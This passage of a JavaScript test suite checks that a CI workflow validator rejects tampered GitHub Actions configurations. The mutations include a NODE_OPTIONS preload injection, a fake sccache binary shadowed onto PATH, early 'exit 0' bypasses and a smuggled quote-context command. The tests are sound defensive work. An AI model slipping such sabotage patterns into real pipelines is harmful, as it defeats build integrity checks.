      const workflows = loadWorkflows();
      mutate(workflows);
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("Windows package proof retains the readable native sccache executable", () => {
  const directory = mkdtempSync(path.join(os.tmpdir(), "codestory-windows-sccache-"));
  try {
    const extensionlessPath = path.join(directory, "sccache");
    const nativePath = `${extensionlessPath}.exe`;
    const captureOutput = path.join(directory, "capture-output");
    const nativeCalls = path.join(directory, "native-calls");
    const decoyCalls = path.join(directory, "decoy-calls");
    const decoyDirectory = path.join(directory, "decoy");
    const decoyPath = path.join(decoyDirectory, "sccache");
    mkdirSync(decoyDirectory);
    writeFileSync(
      nativePath,
      "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"$SCCACHE_CALL_LOG\"\n",
    );
    chmodSync(nativePath, 0o755);
    writeFileSync(
      decoyPath,
      "#!/bin/sh\nprintf '%s\\n' \"$*\" >> \"$DECOY_CALL_LOG\"\n",
    );
    chmodSync(decoyPath, 0o755);
    writeFileSync(captureOutput, "");
    writeFileSync(nativeCalls, "");
    writeFileSync(decoyCalls, "");

    const workflow = loadWorkflows().get("packaged-platform-proof.yml");
    const captureRun = draftStep(
      workflow.jobs.build,
      "Capture pinned sccache identity",
    ).run;
    const captureResult = spawnSync(
      "bash",
      ["-c", `command() {
  if [[ "$1" == "-v" && "$2" == "sccache" ]]; then
    printf '%s\\n' "$SYNTHETIC_SCCACHE_COMMAND"
  else
    builtin command "$@"
  fi
}
test() {
  if [[ "$1" == "-x" && "$2" == "$SYNTHETIC_SCCACHE_COMMAND" ]]; then
    return 0
  fi
  builtin test "$@"
}
${captureRun}`],
      {
        encoding: "utf8",
        env: {
          ...process.env,
          GITHUB_OUTPUT: captureOutput,
          RUNNER_OS: "Windows",
          SYNTHETIC_SCCACHE_COMMAND: extensionlessPath,
        },
      },
    );
    assert.equal(
      captureResult.status,
      0,
      `capture failed:\n${captureResult.stdout}\n${captureResult.stderr}`,
    );
    const captured = Object.fromEntries(
      readFileSync(captureOutput, "utf8")
        .trim()
        .split("\n")
        .map(line => {
          const separator = line.indexOf("=");
          return [line.slice(0, separator), line.slice(separator + 1)];
        }),
    );
    assert.equal(captured.path, nativePath);
    assert.equal(
      captured.sha256,
      createHash("sha256").update(readFileSync(nativePath)).digest("hex"),
    );

    const finalizerRun = draftStep(
      workflow.jobs.build,
      "Finalize compiler objects",
    ).run;
    const finalizerResult = spawnSync("bash", ["-c", finalizerRun], {
      encoding: "utf8",
      env: {
        ...process.env,
        DECOY_CALL_LOG: decoyCalls,
        PATH: `${decoyDirectory}:${process.env.PATH}`,
        SCCACHE_BINARY: captured.path,
        SCCACHE_CALL_LOG: nativeCalls,
        SCCACHE_SHA256: captured.sha256,
      },
    });
    assert.equal(
      finalizerResult.status,
      0,
      `finalizer failed:\n${finalizerResult.stdout}\n${finalizerResult.stderr}`,
    );
    assert.equal(readFileSync(nativeCalls, "utf8"), "--show-stats\n--stop-server\n");
    assert.equal(readFileSync(decoyCalls, "utf8"), "");
  } finally {
    rmSync(directory, { force: true, recursive: true });
  }
});

test("reusable compiler caches and proof modes reject hostile downgrades", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const sourceFile = "source-proof.yml";
  const packagedFile = "packaged-platform-proof.yml";
  const coordinatorFile = "packaged-platform-pr.yml";
  const releaseFile = "release.yml";
  const sourceJob = workflow => workflow.jobs["full-source-gate"];
  const packagedJob = workflow => workflow.jobs.build;
  const sourceIdentity = workflow =>
    draftStep(sourceJob(workflow), "Capture reusable build cache contract");
  const packagedIdentity = workflow =>
    draftStep(packagedJob(workflow), "Capture reusable build cache contract");

  const mutations = [
    ["packaged workflow injects an earlier Node preload", packagedFile, workflow => {
      workflow.env.NODE_OPTIONS = "--require ./fake-hash.cjs";
    }, /packaged-platform-proof\.yml must match the reviewed canonical workflow structure/u],
    ["release workflow policy loses its full history", releaseFile, workflow => {
      delete workflow.jobs["workflow-policy"].steps[0].with;
    }, /workflow-policy must check out full history for the reuse-binding contracts/u],
    ["marketplace preflight proves the live revision against a fixture", releaseFile, workflow => {
      const step = draftStep(workflow.jobs["preflight"], "Prove the public marketplace install path");
      step.run = step.run.replace('--marketplace-revision "$fixture_revision"', '--marketplace-revision "$marketplace_revision"');
    }, /--marketplace-revision "\$fixture_revision"/u],
    ["source compiler restore becomes exact-SHA-only", sourceFile, workflow => {
      draftStep(sourceJob(workflow), "Restore compatible compiler objects")
        .with["restore-keys"] = "${{ steps.build-cache.outputs.compiler-key }}";
    }, /source-proof\.yml compiler cache must restore the newest compatible prior candidate/u],
    ["packaged compiler restore becomes exact-SHA-only", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Restore compatible compiler objects")
        .with["restore-keys"] = "${{ steps.build-cache.outputs.compiler-key }}";
    }, /packaged-platform-proof\.yml compiler cache must restore the newest compatible prior candidate/u],
    ["packaged dependency restore accepts stale inputs", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Restore Cargo dependency inputs")
        .with["restore-keys"] = "codestory-release-dependencies-";
    }, /dependency cache must be exact-input-only and exclude compiler output/u],
    ["source dependency cache escapes isolation", sourceFile, workflow => {
      draftStep(sourceJob(workflow), "Restore Cargo dependency inputs")
        .with.path = "~/.cargo/registry\n~/.cargo/git";
    }, /dependency cache must be exact-input-only and exclude compiler output/u],
    ["packaged dependency cache escapes isolation", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Restore Cargo dependency inputs")
        .with.path = "~/.cargo/registry\n~/.cargo/git";
    }, /dependency cache must be exact-input-only and exclude compiler output/u],
    ["packaged dependency cache loses its bound", packagedFile, workflow => {
      delete workflow.env.CARGO_DEPENDENCY_CACHE_MAX_BYTES;
    }, /must pin bounded compiler and dependency caches/u],
    ["packaged Windows compiler cache loses its mixed-workload bound", packagedFile, workflow => {
      workflow.env.WINDOWS_SCCACHE_CACHE_SIZE = "1G";
    }, /must pin bounded compiler and dependency caches/u],
    ["source invalidation loses Cargo.lock", sourceFile, workflow => {
      sourceIdentity(workflow).run = sourceIdentity(workflow).run
        .replace("--lock-file Cargo.lock", "--lock-file Cargo.toml");
    }, /source-proof\.yml must compute one reusable compiler compatibility contract/u],
    ["source invalidation loses Cargo config", sourceFile, workflow => {
      sourceIdentity(workflow).run = sourceIdentity(workflow).run
        .replace("--cargo-config .cargo/config.toml", "--cargo-config Cargo.toml");
    }, /source-proof\.yml must compute one reusable compiler compatibility contract/u],
    ["source invalidation loses feature set", sourceFile, workflow => {
      sourceIdentity(workflow).run = sourceIdentity(workflow).run
        .replace(
          "--features workspace-test-default-and-clippy-all-targets-all-features",
          "--features default",
        );
    }, /source-proof\.yml must compute one reusable compiler compatibility contract/u],
    ["source invalidation loses workspace manifests", sourceFile, workflow => {
      sourceIdentity(workflow).run = sourceIdentity(workflow).run
        .replace("git ls-files '*Cargo.toml'", "printf '%s\\n' Cargo.toml");
    }, /source-proof\.yml must compute one reusable compiler compatibility contract/u],
    ["packaged invalidation loses Rust version", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--rust-version "$rust_version"', "--rust-release ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses target", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--target "${{ matrix.rust_target }}"', "--architecture ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses feature set", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("--features codestory-cli-default-features", "--features default");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses native toolchain", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--native-toolchain "$native_toolchain"', "--toolchain ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses generator", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--generator "$generator"', "--build-system ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses CMake", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--cmake-version "$cmake_version"', "--cmake ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Ninja", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--ninja-version "$ninja_version"', "--ninja ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Cargo.lock", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("--lock-file Cargo.lock", "--lock-file Cargo.toml");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Cargo config", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("--cargo-config .cargo/config.toml", "--cargo-config Cargo.toml");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses workspace manifests", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("git ls-files '*Cargo.toml'", "printf '%s\\n' Cargo.toml");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Windows native installer", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace(".github/scripts/install-windows-vulkan-sdk.ps1", "ignored-windows-input");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Linux Dockerfile", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace(".github/docker/linux-glibc-build.Dockerfile", ".github/docker/ignored.Dockerfile");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Linux glslc inputs", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace(".github/docker/glslc", ".github/docker/ignored-glslc");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Linux build image", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("LINUX_GLIBC_BUILD_IMAGE", "UNPINNED_BUILD_IMAGE");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Linux glslc image", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("LINUX_GLSLC_IMAGE", "UNPINNED_GLSLC_IMAGE");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged workload variants collide", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace(
          '--identity "qualification_driver=$INCLUDE_QUALIFICATION_DRIVER"',
          "--workload ignored",
        );
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["pinned sccache identity capture moves away from installation", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Capture pinned sccache identity",
        "Configure bounded compiler cache",
      );
    }, /must capture the pinned sccache identity immediately after installation/u],
    ["pinned sccache identity capture stops hashing the binary", packagedFile, workflow => {
      const capture = draftStep(packagedJob(workflow), "Capture pinned sccache identity");
      capture.run = capture.run.replace(
        'createHash("sha256").update(readFileSync(process.argv[1])).digest("hex")',
        '"unverified"',
      );
    }, /pinned sccache identity capture script exactly/u],
    ["Windows sccache identity strips the native extension", packagedFile, workflow => {
      const capture = draftStep(packagedJob(workflow), "Capture pinned sccache identity");
      capture.run = capture.run.replace(
        'sccache_path="${sccache_path}.exe"',
        'sccache_path="${sccache_path%.exe}"',
      );
    }, /pinned sccache identity capture script exactly/u],
    ["sccache identity returns to PATH after native resolution", packagedFile, workflow => {
      const capture = draftStep(packagedJob(workflow), "Capture pinned sccache identity");
      capture.run = capture.run.replace(
        'test -f "$sccache_path"',
        'sccache_path="$(command -v sccache)"\ntest -f "$sccache_path"',
      );
    }, /pinned sccache identity capture script exactly/u],
    ["sccache identity hashes one path and retains another", packagedFile, workflow => {
      const capture = draftStep(packagedJob(workflow), "Capture pinned sccache identity");
      capture.run = capture.run.replace(
        'echo "path=$sccache_path"',
        'echo "path=$(command -v sccache)"',
      );
    }, /pinned sccache identity capture script exactly/u],
    ["source compiler cache waits for tests", sourceFile, workflow => {
      moveNamedStepAfter(
        sourceJob(workflow),
        "Save compiler objects after compilation",
        "Test the complete workspace once",
      );
    }, /source-proof\.yml compiler cache must save before test execution or release-cell failure/u],
    ["packaged compiler cache waits for protected regression", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Save compiler objects after compilation",
        "Test immutable native staging on Windows",
      );
    }, /compiler cache must save before late Test immutable native staging on Windows failure/u],
    ["packaged compiler cache waits for signing", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Save compiler objects after compilation",
        "Sign and notarize macOS CLI",
      );
    }, /compiler cache must save before late Sign and notarize macOS CLI failure/u],
    ["packaged compiler cache waits for packaging", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Save compiler objects after compilation",
        "Package release asset",
      );
    }, /compiler cache must save before late Package release asset failure/u],
    ["packaged compile timer includes cache uploads", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Stop compilation clock",
        "Save compiler objects after compilation",
      );
    }, /compile and compiler-cache-save timings must cover only their named stages/u],
    ["source compile telemetry omits its end boundary", sourceFile, workflow => {
      const report = draftStep(sourceJob(workflow), "Report compiler cache save");
      report.run = report.run.replace('--ended-ms "$ENDED_MS" \\\n', "");
    }, /step Report compiler cache save must run --ended-ms/u],
    ["source cache restores Cargo target output", sourceFile, workflow => {
      const restore = draftStep(sourceJob(workflow), "Restore compatible compiler objects");
      restore.with.path += "\ntarget";
    }, /source-proof\.yml cache paths must exclude Cargo target and exact proof outputs/u],
    ["packaged cache restores release-dist", packagedFile, workflow => {
      const restore = draftStep(packagedJob(workflow), "Restore compatible compiler objects");
      restore.with.path += "\nrelease-dist";
    }, /packaged-platform-proof\.yml cache paths must exclude Cargo target, native seeds, models, proofs, and exact archives/u],
    ["packaged cache restores an exact archive", packagedFile, workflow => {
      const restore = draftStep(packagedJob(workflow), "Restore compatible compiler objects");
      restore.with.path += "\n/tmp/codestory-linux-x64.tar.gz";
    }, /packaged-platform-proof\.yml cache paths must exclude Cargo target, native seeds, models, proofs, and exact archives/u],
    ["packaged cache saves proof output", packagedFile, workflow => {
      const save = draftStep(packagedJob(workflow), "Save compiler objects after compilation");
      save.with.path += "\ntarget/notarization-proof";
    }, /packaged-platform-proof\.yml cache paths must exclude Cargo target, native seeds, models, proofs, and exact archives/u],
    ["package dispatch mode is removed", coordinatorFile, workflow => {
      workflow.on.workflow_dispatch.inputs.mode.options
        = workflow.on.workflow_dispatch.inputs.mode.options.filter(mode => mode !== "package");
    }, /packaged-platform-pr\.yml dispatch modes changed/u],
    ["package mode skips archive construction", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].if = workflow.jobs["packaged-proof"].if
        .replace("needs.route.outputs.mode == 'package' || ", "");
    }, /package and platform modes must build fresh archives while only qualification runs the cold Linux boundary/u],
    ["package mode enables frozen Linux qualification", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.hermetic_linux = true;
    }, /package and platform modes must build fresh archives while only qualification runs the cold Linux boundary/u],
    ["qualification mode disables frozen Linux qualification", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.hermetic_linux = false;
    }, /package and platform modes must build fresh archives while only qualification runs the cold Linux boundary/u],
    ["platform mode enables frozen Linux qualification", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.hermetic_linux
        = "${{ needs.route.outputs.mode == 'platform' }}";
    }, /package and platform modes must build fresh archives while only qualification runs the cold Linux boundary/u],
    ["package mode enables protected Metal proof", coordinatorFile, workflow => {
      workflow.jobs["macos-metal-proof"].if = workflow.jobs["macos-metal-proof"].if
        .replace("needs.route.outputs.mode != 'package' &&", "");
    }, /package-only mode must skip protected Metal proof/u],
    ["package mode enables protected Windows proof", coordinatorFile, workflow => {
      workflow.jobs["windows-vulkan-proof"].if = workflow.jobs["windows-vulkan-proof"].if
        .replace("needs.route.outputs.mode != 'package' &&", "");
    }, /package-only mode must skip Windows while qualification requires successful Metal/u],
    ["package mode enables protected Linux proof", coordinatorFile, workflow => {
      workflow.jobs["linux-vulkan-proof"].if = workflow.jobs["linux-vulkan-proof"].if
        .replace("needs.route.outputs.mode != 'package' &&", "");
    }, /package-only and qualification modes must skip coordinator Linux proof/u],
    ["calibration mode restores hosted Linux CPU calibration", coordinatorFile, workflow => {
      workflow.jobs["calibration-linux"] = {
        if: "needs.route.outputs.mode == 'calibration'",
        needs: "route",
        uses: "./.github/workflows/packaged-platform-proof.yml",
        with: {
          version: "${{ needs.route.outputs.version }}",
          ref: "${{ needs.route.outputs.head_sha }}",
          calibration_mode: true,
        },
      };
    }, /calibration must not schedule hosted Linux CPU/u],
    ["coordinator adds a macOS source hard gate", coordinatorFile, workflow => {
      workflow.jobs["macos-source"] = {
        "runs-on": "macos-14",
        steps: [],
      };
    }, /packaged-platform-pr\.yml standard coordinator must not add a macOS source hard gate/u],
    ["package matrix repeats frozen Linux qualification", packagedFile, workflow => {
      packagedJob(workflow).steps.push(structuredClone(draftStep(
        workflow.jobs["frozen-linux-qualification"],
        "Prove fresh-target Node-absent network-denied Cargo release boundary",
      )));
    }, /matrix package jobs must not repeat the frozen Linux Cargo boundary/u],
    ["frozen Linux qualification becomes unconditional", packagedFile, workflow => {
      workflow.jobs["frozen-linux-qualification"].if = "always()";
    }, /frozen Linux Cargo boundary must be one explicit post-package job/u],
    ["frozen Linux qualification restores exact archives", packagedFile, workflow => {
      workflow.jobs["frozen-linux-qualification"].steps.push({
        name: "Restore exact package archive",
        uses: "actions/cache/restore@v5",
        with: {
          path: "release-dist/codestory-linux-x64.tar.gz",
          key: "forbidden-exact-archive",
        },
      });
    }, /frozen Linux fresh-target qualification must not restore compiler output/u],
    ["Linux compiler cache omits server shutdown", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = build.run.replace("/sccache/sccache --stop-server", "true");
    }, /Linux container build and compiler-server ownership script exactly/u],
    ["Linux compiler cache makes statistics advisory", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = build.run.replace(
        "/sccache/sccache --show-stats",
        "/sccache/sccache --show-stats || true",
      );
    }, /Linux container build and compiler-server ownership script exactly/u],
    ["Linux compiler cache makes shutdown advisory", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = build.run.replace(
        "/sccache/sccache --stop-server",
        "/sccache/sccache --stop-server || true",
      );
    }, /Linux container build and compiler-server ownership script exactly/u],
    ["Linux compiler shutdown is parked in dead code", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = `if false; then\n${build.run}\nfi\n`;
    }, /Linux container build and compiler-server ownership script exactly/u],
    ["Linux compiler shutdown hides behind an exact dead-code decoy", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = build.run.replace(
        "/sccache/sccache --stop-server",
        "/sccache/sccache --stop-server || true",
      );
      build.run += "\nif false; then\n  /sccache/sccache --stop-server\nfi\n";
    }, /Linux container build and compiler-server ownership script exactly/u],
    ["Linux compiler shutdown escapes through a stripped quote-context comment", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = build.run.replace(
        "    /sccache/sccache --show-stats",
        "    # '; exit 0; : '\n    /sccache/sccache --show-stats",
      );
    }, /Linux container build and compiler-server ownership script exactly/u],
    ["Linux compiler shutdown is inverted", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = build.run.replace("docker run --rm", "! docker run --rm");
    }, /Linux container build and compiler-server ownership script exactly/u],
    ["Linux compiler shutdown is bypassed by an early exit", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = `exit 0\n${build.run}`;
    }, /Linux container build and compiler-server ownership script exactly/u],
    ["Linux compiler build shell absorbs failure", packagedFile, workflow => {
      draftStep(
        packagedJob(workflow),
        "Build Linux x64 at the glibc 2.31 baseline",
      ).shell = "bash {0} || true";
    }, /Linux container must strictly report and stop its owned compiler server/u],
    ["Linux compiler cache step becomes advisory", packagedFile, workflow => {
      draftStep(
        packagedJob(workflow),
        "Build Linux x64 at the glibc 2.31 baseline",
      )["continue-on-error"] = true;
    }, /Linux container must strictly report and stop its owned compiler server/u],
    ["Linux compiler cache rebinds the pinned binary", packagedFile, workflow => {
      draftStep(
        packagedJob(workflow),
        "Build Linux x64 at the glibc 2.31 baseline",
      ).env.SCCACHE_BINARY = "sccache";
    }, /Linux container must strictly report and stop its owned compiler server/u],
    ["Linux gains a host compiler finalizer fallback", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Finalize compiler objects").if =
        "always() && ((matrix.asset_target == 'linux-x64' && steps.linux-build.outcome == 'success') || (matrix.asset_target != 'linux-x64' && steps.package-build.outcome == 'success'))";
    }, /host finalizer must strictly stop only the host package-build compiler server/u],
    ["host package build becomes Linux-reachable", packagedFile, workflow => {
      draftStep(
        packagedJob(workflow),
        "Build package and qualification driver",
      ).if = "always()";
    }, /host finalizer must strictly stop only the host package-build compiler server/u],
    ["clock stop prepends a fake compiler cache binary", packagedFile, workflow => {
      const stop = draftStep(packagedJob(workflow), "Stop compilation clock");
      stop.run += [
        "",
        'fake_dir="$RUNNER_TEMP/fake-sccache"',
        'mkdir -p "$fake_dir"',
        "printf '#!/usr/bin/env bash\\nexit 0\\n' > \"$fake_dir/sccache\"",
        'chmod +x "$fake_dir/sccache"',
        'echo "$fake_dir" >> "$GITHUB_PATH"',
      ].join("\n");
    }, /compiler clock stop script exactly/u],
    ["clock stop shell absorbs failure", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Stop compilation clock").shell = "bash {0} || true";
    }, /compiler clock stop must remain a strict telemetry-only boundary/u],
    ["a prep step is inserted before compiler finalization", packagedFile, workflow => {
      const steps = packagedJob(workflow).steps;
      const finalizeIndex = steps.findIndex(step => step.name === "Finalize compiler objects");
      steps.splice(finalizeIndex, 0, {
        name: "Shadow compiler cache",
        shell: "bash",
        run: 'echo "$RUNNER_TEMP/fake-sccache" >> "$GITHUB_PATH"',
      });
    }, /compiler owner build, clock stop, and finalizer must remain adjacent/u],
    ["host compiler statistics become advisory", packagedFile, workflow => {
      const finalize = draftStep(packagedJob(workflow), "Finalize compiler objects");
      finalize.run = finalize.run.replace(
        '"$SCCACHE_BINARY" --show-stats',
        '"$SCCACHE_BINARY" --show-stats || true',
      );
    }, /host compiler-server finalizer script exactly/u],
    ["host compiler shutdown becomes advisory", packagedFile, workflow => {
      const finalize = draftStep(packagedJob(workflow), "Finalize compiler objects");
      finalize.run = finalize.run.replace(
        '"$SCCACHE_BINARY" --stop-server',
        '"$SCCACHE_BINARY" --stop-server || true',
      );
    }, /host compiler-server finalizer script exactly/u],
    ["host compiler shutdown hides behind exact dead-code decoys", packagedFile, workflow => {
      const finalize = draftStep(packagedJob(workflow), "Finalize compiler objects");
      finalize.run = [
        "sccache --show-stats || true",
        "sccache --stop-server || true",
        "if false; then",
        "  sccache --show-stats",
        "  sccache --stop-server",
        "fi",
      ].join("\n");
    }, /host compiler-server finalizer script exactly/u],
    ["host compiler finalizer shell absorbs failure", packagedFile, workflow => {
      draftStep(
        packagedJob(workflow),
        "Finalize compiler objects",
      ).shell = "bash {0} || true";
    }, /host finalizer must strictly stop only the host package-build compiler server/u],
    ["host compiler finalizer step becomes advisory", packagedFile, workflow => {
      draftStep(
        packagedJob(workflow),
        "Finalize compiler objects",
      )["continue-on-error"] = true;
    }, /host finalizer must strictly stop only the host package-build compiler server/u],
    ["host compiler finalizer rebinds the pinned binary", packagedFile, workflow => {
      draftStep(
        packagedJob(workflow),
        "Finalize compiler objects",
      ).env.SCCACHE_BINARY = "sccache";
    }, /host finalizer must strictly stop only the host package-build compiler server/u],
    ["host compiler finalizer resolves through PATH again", packagedFile, workflow => {
      const finalize = draftStep(packagedJob(workflow), "Finalize compiler objects");
      finalize.run = finalize.run.replace(
        '"$SCCACHE_BINARY" --show-stats',
        "sccache --show-stats",
      );
    }, /host compiler-server finalizer script exactly/u],
    ["package checkout accepts a fallback SHA", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Checkout").with.ref = "${{ inputs.ref || github.sha }}";
    }, /package jobs must checkout only the requested exact SHA/u],
    ["package smoke loses source identity", packagedFile, workflow => {
      const smoke = draftStep(packagedJob(workflow), "Smoke packaged release asset");
      smoke.run = smoke.run.replace('--expected-source-sha "$SOURCE_SHA" \\\n', "");
    }, /step Smoke packaged release asset must run --expected-source-sha/u],
    ["fresh package identity is reported after upload", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Report fresh package identity",
        "Upload release asset",
      );
    }, /must report a verified fresh archive identity before upload/u],
    ["release repeats frozen Linux qualification", releaseFile, workflow => {
      workflow.jobs["packaged-proof"].with.hermetic_linux = true;
    }, /release\.yml main release must not repeat frozen-candidate Linux qualification/u],
  ];

  for (const [name, file, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("standard release paths reject calibration plumbing", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const mutations = [
    ["auto-release forwards calibration", workflows => {
      workflows.get("auto-release.yml").jobs.release.with.calibration_bundle_artifact
        = "${{ vars.CODESTORY_CALIBRATION_BUNDLE_ARTIFACT }}";
    }, /auto-release\.yml standard release path must not reference calibration/u],
    ["release accepts calibration input", workflows => {
      workflows.get("release.yml").on.workflow_call.inputs.calibration_bundle_artifact = {
        required: true,
        type: "string",
      };
    }, /release\.yml standard release path must not reference calibration/u],
    ["release forwards calibration to package proof", workflows => {
      workflows.get("release.yml").jobs["packaged-proof"].with.calibration_bundle_run_id
        = "${{ inputs.calibration_bundle_run_id }}";
    }, /release\.yml standard release path must not reference calibration/u],
    ["release hides calibration plumbing in a same-named decoy step", workflows => {
      workflows.get("release.yml").jobs["workflow-policy"].steps.push({
        name: "Verify release-head calibration lineage",
        run: "echo calibration_bundle_artifact",
      });
    }, /release\.yml standard release path must not reference calibration/u],
    ["post-publish proof receives calibration", workflows => {
      const step = draftStep(
        workflows.get("post-publish-release-smoke.yml").jobs.smoke,
        "Prove the catalog-resolved published runtime",
      );
      step.run += '\n--calibration-bundle "$calibration_bundle"';
    }, /post-publish-release-smoke\.yml standard release path must not reference calibration/u],
    ["accelerator cell claims calibration identity", workflows => {
      const step = draftStep(
        workflows.get("macos-metal-proof.yml").jobs["packaged-metal"],
        "Emit authenticated Metal release cell",
      );
      step.run += "\ncalibration_sha256=forged";
    }, /must not run calibration/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows);
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("Cargo lock policy reads executable step commands", () => {
  const workflow = parseWorkflow(`
on: { workflow_dispatch: null }
permissions: { contents: read }
jobs:
  check:
    timeout-minutes: 5
    steps:
      - run: |
          # cargo test --workspace
          cargo test --workspace --locked
`);
  assert.deepEqual(basicWorkflowViolations("fixture.yml", workflow), []);

  workflow.jobs.check.steps[0].run += "\ncargo check --workspace\n";
  assert.match(basicWorkflowViolations("fixture.yml", workflow).join("\n"), /must use --locked/u);
});

test("draft source cache reuse preserves exact serial proof structure", async (t) => {
  assert.deepEqual(draftSourcePolicyViolations(draftSourceJob(), retrievalSourceJob()), []);

  const mutations = [
    ["unversioned primary", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with.key = step.with.key.replace("-draft-v2-", "-draft-");
    }],
    ["lock-only primary", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with.key = step.with.key.replace(`${cacheManifestIdentity}-`, "");
    }],
    ["mismatched proof topology", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with.key = step.with.key.replace(proofTopology, proofTopology.replace("-v1-", "-v2-"));
    }],
    ["fallback order reversal", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with["restore-keys"] = step.with["restore-keys"].trim().split("\n").reverse().join("\n");
    }],
    ["overbroad draft fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      const keys = step.with["restore-keys"].trim().split("\n");
      keys[1] = "${{ runner.os }}-draft-v2-";
      step.with["restore-keys"] = keys.join("\n");
    }],
    ["cross-platform fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with["restore-keys"] = step.with["restore-keys"].replace("${{ runner.os }}-cargo-stable-", "Windows-cargo-stable-");
    }],
    ["all-feature fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with["restore-keys"] = step.with["restore-keys"].replace("-default-features-", "-all-features-");
    }],
